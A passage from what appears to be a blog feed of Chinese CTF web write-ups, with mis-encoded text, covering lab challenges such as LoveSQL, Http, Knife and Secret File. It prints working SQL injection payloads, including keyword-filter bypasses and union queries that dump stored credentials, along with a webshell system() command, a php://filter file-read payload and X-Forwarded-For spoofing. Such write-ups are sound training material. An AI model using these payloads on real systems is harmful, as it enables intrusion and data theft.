src="https://raw.githubusercontent.com/x2658y/static/master/images/202111062316462.png"
alt="image-20211106231659231" />
<figcaption aria-hidden="true">image-20211106231659231</figcaption>
</figure>
<p>è¯•è¯•ä¸‡èƒ½å¯†ç </p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111062316743.png"
alt="image-20211106231624603" />
<figcaption aria-hidden="true">image-20211106231624603</figcaption>
</figure>
<p>ä¸è¡Œ, æ³¨æ„çœ‹å›¾ä¸Šçš„åœ°æ–¹, æäº¤çš„å‚æ•°ä¸­çš„<code>or</code>è¢«åˆ æ‰äº†,
åº”è¯¥æ˜¯å­—ç¬¦ä¸²æ›¿æ¢ä¹‹ç±»çš„</p>
<p>ç»è¿‡å°è¯•<code>or</code>, <code>and</code>, <code>from</code>,
<code>where</code>, <code>select</code>ç­‰å…³é”®å­—éƒ½ä¼šè¢«åˆ é™¤,
ä½†æ˜¯åªä¼šåˆ é™¤ä¸€æ¬¡, æ‰€ä»¥å¯ä»¥é‡‡ç”¨åŒå†™ç»•è¿‡.</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111062322167.png"
alt="image-20211106232220046" />
<figcaption aria-hidden="true">image-20211106232220046</figcaption>
</figure>
<p>åç»­é‡‡ç”¨åŒå†™æµ‹å‡ºæ³¨å…¥ç‚¹, åœ¨ç¬¬2,3åˆ—, åç»­æ¥ç€é‡‡ç”¨åŒå†™ç»•è¿‡å­—ç¬¦æ›¿æ¢.</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111062323947.png"
alt="image-20211106232338835" />
<figcaption aria-hidden="true">image-20211106232338835</figcaption>
</figure>
<p>å…·ä½“æ“ä½œä¸<a
href="/2021/10/30/%5BWeb%5Dæå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL-1/">[æå®¢å¤§æŒ‘æˆ˜
2019]LoveSQL 1</a>å¤§ä½“ç›¸åŒ.</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨</tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ 1</title>
    <url>/2021/10/29/%5BWeb%5D%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/</url>
    <content><![CDATA[<p>æŸ¥çœ‹æºä»£ç æœªæ‰¾åˆ°æœ‰ç”¨ä¿¡æ¯, å°è¯•æäº¤æ•°å­—1, è¿”å›ä¸€ä¸ªæ•°ç»„,
æ¥ç€å°è¯•æ³¨å…¥<code>1' or 1;%23</code>, æˆåŠŸè¿”å›ä¸‰ä¸ªæ•°ç»„,ä½†æœªæ‰¾åˆ°flag.</p>
<p><img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291646793.png"
alt="image-20211029164617724" /><img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291647411.png"
alt="image-20211029164706347" /></p>
<p>å°è¯•å †å æ³¨å…¥</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1;show tables;%23</span></span><br></pre></td></tr></table></figure>
<p>æŸ¥å‡ºè¡¨å,å¯ä»¥çœ‹åˆ°<code>words</code>å’Œ<code>1919810931114514</code>ä¸¤ä¸ªè¡¨</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291651805.png"
alt="image-20211029165116741" />
<figcaption aria-hidden="true">image-20211029165116741</figcaption>
</figure>
<p>å †å æ³¨å…¥</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1;show tables;desc `1919810931114514`;desc `words`;%23</span></span><br></pre></td></tr></table></figure>
<p>æŸ¥å‡ºä¸¤ä¸ªè¡¨çš„å­—æ®µ.</p>
<p>è§‚å¯Ÿåˆ°<code>words</code>è¡¨æœ‰ä¸¤ä¸ªå­—æ®µ<code>id</code>å’Œ<code>data</code>,
<code>1919810931114514</code>ä»…æœ‰ä¸€ä¸ªå­—æ®µ<code>flag</code>,
çŒœæµ‹<strong>flag</strong>å°±åœ¨è¡¨<code>1919810931114514</code>ä¸­.</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291701074.png"
alt="image-20211029170144998" />
<figcaption aria-hidden="true">image-20211029170144998</figcaption>
</figure>
<p>å°è¯•æ³¨å…¥</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1;select * from `1919810931114514`;%23</span></span><br></pre></td></tr></table></figure>
<p>æç¤º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>);, </span><br></pre></td></tr></table></figure>
<p>å¾—çŸ¥æœ‰å…³é”®å­—å®¡æŸ¥</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110292207097.png"
alt="image-20211029220716039" />
<figcaption aria-hidden="true">image-20211029220716039</figcaption>
</figure>
<p>é‡‡ç”¨<strong>é¢„ç¼–è¯‘</strong>çš„æ–¹å¼ç»•è¿‡å…³é”®å­—å®¡æŸ¥, æ„é€ æ³¨å…¥è¯­å¥:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;set @sql = CONCAT(&#x27;</span>se<span class="string">&#x27;,&#x27;</span>lect <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);prepare stmt from @sql;EXECUTE stmt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#æ‹†å¼€ä¸º</span></span><br><span class="line"><span class="string">1&#x27;</span>; #é—­åˆå•å¼•å·</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@sql</span> <span class="operator">=</span> CONCAT(<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;lect * from `1919810931114514`;&#x27;</span>); #å®šä¹‰å˜é‡,é‡‡ç”¨CONCAT()æ‹¼æ¥å­—ç¬¦ä¸²ç»•è¿‡å®¡æŸ¥</span><br><span class="line"><span class="keyword">prepare</span> stmt <span class="keyword">from</span> <span class="variable">@sql</span>; #é¢„ç¼–è¯‘<span class="keyword">SQL</span>è¯­å¥</span><br><span class="line"><span class="keyword">EXECUTE</span> stmt; #æ‰§è¡Œç¼–è¯‘å®Œçš„<span class="keyword">SQL</span>è¯­å¥</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110292236737.png"
alt="image-20211029223621684" />
<figcaption aria-hidden="true">image-20211029223621684</figcaption>
</figure>
<p>æç¤º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;set&quot;</span>) &amp;&amp; <span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;prepare&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>æœ‰ç¬¬äºŒé“å…³é”®å­—å®¡æŸ¥, ç”±äºstrstråŒºåˆ†å¤§å°å†™, è€Œsetå’Œprepareå¤§å°å†™ä¸æ•æ„Ÿ,
æ•…æ›´æ”¹æ³¨å…¥è¯­å¥ä¸º</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;Set @sql = CONCAT(&#x27;</span>se<span class="string">&#x27;,&#x27;</span>lect <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);Prepare stmt from @sql;EXECUTE stmt;</span></span><br></pre></td></tr></table></figure>
<p>å³å¯ç»•è¿‡å®¡æŸ¥, æ‹¿åˆ°flag</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110292237890.png"
alt="image-20211029223717822" />
<figcaption aria-hidden="true">image-20211029223717822</figcaption>
</figure>
<blockquote>
<p>æºä»£ç </p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf1</span>(<span class="params"><span class="variable">$inject</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>) &amp;&amp; <span class="keyword">die</span>(<span class="string">&#x27;return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf2</span>(<span class="params"><span class="variable">$inject</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;set&quot;</span>) &amp;&amp; <span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;prepare&quot;</span>) &amp;&amp; <span class="keyword">die</span>(<span class="string">&#x27;strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;inject&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;inject&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">waf1</span>(<span class="variable">$id</span>);</span><br><span class="line">    <span class="title function_ invoke__">waf2</span>(<span class="variable">$id</span>);</span><br><span class="line">    <span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;supersqli&quot;</span>);</span><br><span class="line">    <span class="comment">//å¤šæ¡sqlè¯­å¥</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from `words` where id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">multi_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$res</span>)&#123;<span class="comment">//ä½¿ç”¨multi_query()æ‰§è¡Œä¸€æ¡æˆ–å¤šæ¡sqlè¯­å¥</span></span><br><span class="line">      <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$rs</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">store_result</span>())&#123;<span class="comment">//store_result()æ–¹æ³•è·å–ç¬¬ä¸€æ¡sqlè¯­å¥æŸ¥è¯¢ç»“æœ</span></span><br><span class="line">          <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$rs</span>-&gt;<span class="title function_ invoke__">fetch_row</span>())&#123;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$row</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="variable">$rs</span>-&gt;<span class="title function_ invoke__">Close</span>(); <span class="comment">//å…³é—­ç»“æœé›†</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">more_results</span>())&#123;  <span class="comment">//åˆ¤æ–­æ˜¯å¦è¿˜æœ‰æ›´å¤šç»“æœé›†</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">while</span>(<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">next_result</span>()); <span class="comment">//next_result()æ–¹æ³•è·å–ä¸‹ä¸€ç»“æœé›†ï¼Œè¿”å›boolå€¼</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;error &quot;</span>.<span class="variable">$mysqli</span>-&gt;errno.<span class="string">&quot; : &quot;</span>.<span class="variable">$mysqli</span>-&gt;error;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();  <span class="comment">//å…³é—­æ•°æ®åº“è¿æ¥</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨</tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL 1</title>
    <url>/2021/10/30/%5BWeb%5D%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL-1/</url>
    <content><![CDATA[<p>é¦–å…ˆæŒ‰ç…§æƒ¯ä¾‹, ä¸‡èƒ½å¯†ç æ³¨å…¥, æˆåŠŸ, å‡ºæ¥ä¸ªç”¨æˆ·åå’Œå¯†ç ,
ç„¶è€Œå¥½åƒå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301809821.png"
alt="image-20211030180951656" /></p>
<p>ç„¶åä»<code>order by 1</code>è¯•åˆ°<code>order by 3</code>æ­£å¸¸å›æ˜¾,
<code>order by 4</code>æŠ¥é”™, å¾—çŸ¥æœ‰3ä¸ªå­—æ®µ</p>
<p>é‡‡ç”¨è”åˆæŸ¥è¯¢å¯»æ‰¾å›æ˜¾ç‚¹ä½:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=x2658y&amp;password=1&#x27; union select 1,2,3;%23</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301818338.png"
alt="image-20211030181855242" />
<figcaption aria-hidden="true">image-20211030181855242</figcaption>
</figure>
<p>å¯çŸ¥ç¬¬2, 3å­—æ®µæ•°æ®ä¼šè¢«å›æ˜¾,
å¯ä»¥åœ¨è¿™ä¸¤å¤„ä½¿ç”¨å‡½æ•°database()æ‹¿åˆ°æ•°æ®åº“å:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=x2658y&amp;password=1&#x27; union select 1,database(),3;%23</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301822176.png"
alt="image-20211030182223082" />
<figcaption aria-hidden="true">image-20211030182223082</figcaption>
</figure>
<p>æ•°æ®åº“åä¸ºgeek, æ¥ä¸‹æ¥å¯ä»¥è¿›ä¸€æ­¥æ‹¿åˆ°è¡¨å.</p>
<p>æ•°æ®åº“ç³»ç»Ÿä¸­,
è‡ªå¸¦çš„<code>information_schema</code>æ•°æ®åº“ä¸­å‚¨å­˜ç€æ‰€æœ‰æ•°æ®åº“çš„è¡¨å,
å­—æ®µåç­‰å„ç§ä¿¡æ¯,
ä»è¿™é‡Œé¢å¯ä»¥å¾—çŸ¥<code>geek</code>æ•°æ®åº“é‡Œçš„è¡¨åå’Œè¡¨é‡Œçš„å­—æ®µåç­‰</p>
<p><code>information_schema.tables</code>è¡¨ä¸­å­˜å‚¨ç€æ•°æ®åº“åå¯¹åº”çš„æ‰€æœ‰è¡¨å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=x2658y&amp;password=1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;geek&#x27;;%23</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ³¨æ„<code>table_schema='geek'</code>ä¸­çš„geekè¦åŠ å¼•å·, å› ä¸ºå®ƒæ˜¯å­—ç¬¦ä¸²,
å½“<code>where</code>å­å¥æ¯”è¾ƒå¯¹è±¡æ˜¯æ•°å­—æ—¶,
æ¯”å¦‚<code>where id &gt; 50</code>æ—¶ä¸éœ€è¦å¼•å·.</p>
</blockquote>
<blockquote>
<p><code>group_concat()</code>è¯¥å­—æ®µçš„æ‰€æœ‰å€¼åˆå¹¶(é»˜è®¤)ä»¥','åˆ†éš”</p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301841257.png"
alt="image-20211030184112176" />
<figcaption aria-hidden="true">image-20211030184112176</figcaption>
</figure>
<p>å¯ä»¥çœ‹åˆ°,
<code>geek</code>æ•°æ®åº“ä¸­æœ‰ä¸¤ä¸ªè¡¨<code>geekuser</code>å’Œ<code>l0ve1ysq1</code>,
çŒœæµ‹æ•°æ®å°±åœ¨<code>l0ve1ysq1</code>è¡¨ä¸­. åŒç†,
ä»<code>information_schema.columns</code>é‡Œå–å‡º<code>l0ve1ysq1</code>çš„æ‰€æœ‰å­—æ®µå,
ç„¶åä¸‡äº‹ä¿±å¤‡, å°±å¯ä»¥è”åˆæŸ¥è¯¢æ‹¿åˆ°è¡¨ä¸­çš„æ‰€æœ‰æ•°æ®äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=x2658y&amp;password=1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;l0ve1ysq1&#x27;;%23</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301956773.png"
alt="image-20211030195642687" />
<figcaption aria-hidden="true">image-20211030195642687</figcaption>
</figure>
<p>å¯ä»¥çœ‹åˆ°,å…±æœ‰ä¸‰ä¸ªå­—æ®µ<code>id</code>,<code>username</code>,<code>password</code>,
æ¥ä¸‹æ¥å°è¯•ä¸€ä¸‹æå–æ‰€æœ‰æ•°æ®(ä¸ºäº†æ–¹ä¾¿è§‚å¯Ÿ,å°†<code>id</code>,<code>username</code>,<code>password</code>ä¹‹é—´ç”¨'-'åˆ†å‰²å¼€)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=x2658y&amp;password=1&#x27; union select 1,group_concat(id,&#x27;-&#x27;,username,&#x27;-&#x27;,password),3 from geek.l0ve1ysq1;%23</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110302006730.png"
alt="image-20211030200642577" />
<figcaption aria-hidden="true">image-20211030200642577</figcaption>
</figure>
<p>äºæ˜¯æˆ‘ä»¬å¾—åˆ°äº†è¿™æ ·ä¸€å¨(å—¯,ä¸€å¨)ä¸œè¥¿,
æŸ¥çœ‹æºä»£ç å°±èƒ½æå–å‡ºæ¥ä¸€ä¸²å‡Œä¹±çš„å­—ç¬¦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello 1-cl4y-wo_tai_nan_le,2-glzjin-glzjin_wants_a_girlfriend,3-Z4cHAr7zCr-biao_ge_dddd_hm,4-0xC4m3l-linux_chuang_shi_ren,5-Ayrain-a_rua_rain,6-Akko-yan_shi_fu_de_mao_bo_he,7-fouc5-cl4y,8-fouc5-di_2_kuai_fu_ji,9-fouc5-di_3_kuai_fu_ji,10-fouc5-di_4_kuai_fu_ji,11-fouc5-di_5_kuai_fu_ji,12-fouc5-di_6_kuai_fu_ji,13-fouc5-di_7_kuai_fu_ji,14-fouc5-di_8_kuai_fu_ji,15-leixiao-Syc_san_da_hacker,16-flag-flag&#123;e5a2cc9e-e2bb-4410-9fa1-cf8c2361a9b3&#125;ï¼</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬çš„<strong>flag</strong>å°±åœ¨å…¶ä¸­(ç«Ÿç„¶æ˜¯ç”¨æˆ·çš„å¯†ç ğŸ™„)</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨</tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http 1</title>
    <url>/2021/10/31/%5BWeb%5D%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http-1/</url>
    <content><![CDATA[<p>è¿›å»ä¹‹å, æŒ‰ç…§æƒ¯ä¾‹, å…ˆæŸ¥çœ‹æºä»£ç <img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311336770.png" /></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311335125.png"
alt="image-20211031133550064" />
<figcaption aria-hidden="true">image-20211031133550064</figcaption>
</figure>
<p>æ‰¾åˆ°<code>Secret.php</code>è¿™ä¸ªé¡µé¢, è¿›å…¥</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311338983.png"
alt="image-20211031133804874" />
<figcaption aria-hidden="true">image-20211031133804874</figcaption>
</figure>
<p>çœ‹æç¤º, åº”è¯¥æ˜¯Refererè¯·æ±‚å¤´æ£€æµ‹, åˆ¤æ–­ä»å“ªä¸ªç½‘ç«™è·³è½¬è¿‡æ¥çš„,
ä¸Š<code>Fiddler</code></p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311345734.png" alt="image-20211031134521678" style="zoom:50%;" /></p>
<p><code>Referer</code>ä¼ªè£…å¥½äº†, åˆæç¤ºä½¿ç”¨"Syclover"æµè§ˆå™¨,
é‚£ä¹ˆè¿™æ¬¡å°±æ˜¯åˆ¤æ–­æµè§ˆå™¨<code>UA</code>äº†,
æˆ‘ä»¬æŠŠ<code>UA</code>æ”¹æˆ"Syclover"è¯•è¯•</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311347388.png" alt="image-20211031134743341" style="zoom:50%;" /></p>
<p>é”™è¯¯åˆå˜äº†, è¿™æ¬¡è¯´åªèƒ½ä»æœ¬åœ°è®¿é—®,
æ ¹æ®å‰é¢çš„å‡ æ¬¡ç»éªŒ,è¿™æ¬¡åº”è¯¥è¿˜æ˜¯åˆ¤æ–­è¯·æ±‚å¤´.
æˆ‘ä»¬è¦æ‰¾çš„é‚£ä¸ªè¯·æ±‚å¤´é‡Œè‚¯å®šè®°å½•ç€è¯·æ±‚å‘èµ·æ–¹çš„IP,
æˆ‘ä»¬åªéœ€è¦å°†IPæ”¹æˆæœ¬åœ°ç¯å›åœ°å€127.0.0.1å³å¯</p>
<p>ç»è¿‡ä¸€ç•ªæŸ¥æ‰¾,
<code>X-Forwarded-For</code>è¿™ä¸ªè®°å½•ç€ä»æºä¸»æœºåˆ°ç»è¿‡çš„æ‰€æœ‰ä»£ç†æœåŠ¡å™¨IP,ä¸­é—´ä»¥é€—å·åˆ†éš”.
ä¸ºäº†æ–¹ä¾¿, æˆ‘ä»¬åªéœ€è¦å°†å…¶æŒ‡å®šä¸º127.0.0.1å³å¯</p>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311359642.png" alt="image-20211031135902592" style="zoom:50%;" /></p>
<p>è¿™æ ·, æˆ‘ä»¬å°±æ‹¿åˆ°äº†<strong>flag</strong>~</p>
<blockquote>
<p><a
href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers">å‚è€ƒèµ„æ–™</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife 1</title>
    <url>/2021/10/31/%5BWeb%5D%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-1/</url>
    <content><![CDATA[<p>çœ‹é¡µé¢æç¤º,
å°±æ˜¯ä¸ª<code>POST</code>æäº¤å‚æ•°çš„<code>webshell</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311304517.png"
alt="image-20211031130415463" />
<figcaption aria-hidden="true">image-20211031130415463</figcaption>
</figure>
<p>åœ¨æºç é‡Œå¯ä»¥æ‰¾åˆ°è¾“å‡ºç»“æœ, ç„¶åå°±æ˜¯ä¼ ç»Ÿè‰ºèƒ½,
åˆ°æ ¹ç›®å½•å»çœ‹çœ‹éƒ½æœ‰å•¥å¥½ç©æ„å„¿</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311331857.png"
alt="image-20211031133142800" />
<figcaption aria-hidden="true">image-20211031133142800</figcaption>
</figure>
<p><strong>flag</strong>å°±åœ¨è¿™é‡Œäº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Syc=system(&quot;cd ../../../../../;ls -la;cat flag&quot;);</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311333863.png"
alt="image-20211031133328805" />
<figcaption aria-hidden="true">image-20211031133328805</figcaption>
</figure>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File 1</title>
    <url>/2021/10/30/%5BWeb%5D%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File-1/</url>
    <content><![CDATA[<p>é¦–å…ˆæŸ¥çœ‹æºä»£ç ,æ‰¾åˆ°å…¥å£<code>./Archive_room.php</code><img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301139004.png"
alt="image-20211030113938928" /></p>
<p>è¿›å…¥<code>Archiv_room.php</code>, ç‚¹å‡»æŒ‰é’®å¹¶æŠ“åŒ…<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301140021.png"
alt="image-20211030114045966" /></p>
<p>å¯ä»¥çœ‹åˆ°é€»è¾‘å°±æ˜¯ç‚¹å‡»æŒ‰é’®æœåŠ¡å™¨æŒ‡å®šè·³è½¬åˆ°<code>end.php</code> ,
è¿”å›çš„å†…å®¹ä¸­æœ‰<code>secr3t.php</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301143534.png"
alt="image-20211030114309440" />
<figcaption aria-hidden="true">image-20211030114309440</figcaption>
</figure>
<p>è¿›å…¥<code>secr3t.php</code>é¡µé¢,å¯è§æºä»£ç , æœ‰ä¸€äº›è¿‡æ»¤,
ä½†æ˜¯è²Œä¼¼ä¸å½±å“æ“ä½œ<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301146585.png"
alt="image-20211030114612553" /></p>
<p>å…ˆè¯•è¯•<code>file=flag.php</code><img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301149401.png"
alt="image-20211030114947337" /></p>
<p>æ˜¾ç„¶æ˜¯ä¸è¡Œçš„, <strong>flag</strong>å°±åœ¨<code>flag.php</code>ä¸­,
ä½†æ˜¯æ²¡æœ‰è¢«æ˜¾ç¤ºå‡ºæ¥æˆ‘ä»¬éœ€è¦æ‹¿åˆ°<code>flag.php</code>çš„æºä»£ç æ‰è¡Œ</p>
<p>è¿™é‡Œé‡‡ç”¨<strong>phpä¼ªåè®®</strong>, å®ç°æ–‡ä»¶åŒ…å«,
å°†æºä»£ç æ–‡ä»¶è½¬æ¢æˆbase64ç¼–ç æ˜¾ç¤ºå‡ºæ¥(ä¸ºä»€ä¹ˆè¦ç”¨base64ç¼–ç ?å› ä¸ºincludeå¼•å…¥çš„æ–‡ä»¶å¦‚æœæ˜¯phpæ–‡ä»¶ä¼šè¢«ç›´æ¥æ‰§è¡Œ,
è¿™æ ·å°±æ‹¿ä¸åˆ°æºç äº†, è€Œå¦‚æœæ˜¯éphpæ–‡ä»¶å°±ä¼šè¢«æ˜¾ç¤ºå‡ºæ¥)</p>
<p>æ„é€ payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301204885.png"
alt="image-20211030120426834" />
<figcaption aria-hidden="true">image-20211030120426834</figcaption>
</figure>
<p>å†æŠŠbase64ç¼–ç çš„æºä»£ç è§£ç å°±å¯ä»¥æ‹¿åˆ°<strong>flag</strong></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301205630.png"
alt="image-20211030120555576" />
<figcaption aria-hidden="true">image-20211030120555576</figcaption>
</figure>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload 1</title>
    <url>/2021/10/31/%5BWeb%5D%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload-1/</url>
    <content><![CDATA[<p>è¿›å»å°±æ˜¯ä¸ªæ–‡ä»¶é€‰æ‹©æ¡†, å…ˆä¸Šä¼ ä¸ªå¤´åƒä¸Šå»çœ‹çœ‹, ç”¨BPæŠ“åŒ…</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011616643.png"
alt="image-20211101161653416" />
<figcaption aria-hidden="true">image-20211101161653416</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011617741.png"
alt="image-20211101161704616" />
<figcaption aria-hidden="true">image-20211101161704616</figcaption>
</figure>
